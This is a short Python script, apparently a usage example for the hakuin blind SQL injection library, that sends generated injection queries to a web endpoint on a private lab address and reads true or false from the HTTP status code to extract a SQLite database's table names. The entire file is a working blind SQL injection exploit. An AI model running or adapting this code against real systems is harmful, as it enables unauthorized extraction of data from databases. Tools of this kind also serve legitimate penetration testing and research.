import asyncio
import aiohttp
from hakuin import Extractor, Requester

class SimpleRequester(Requester):
    async def request(self, query, ctx):
        # inject generated queries
        async with aiohttp.request('GET', f'http://192.168.122.191:5000/sqlite?query=({query.render(ctx)})') as resp:
            # infer query results
            return resp.status == 200

async def main():
    async with SimpleRequester() as requester:
        ext = Extractor(requester=requester, dbms='sqlite')
        data = await ext.extract_table_names()
        print(data)

asyncio.run(main())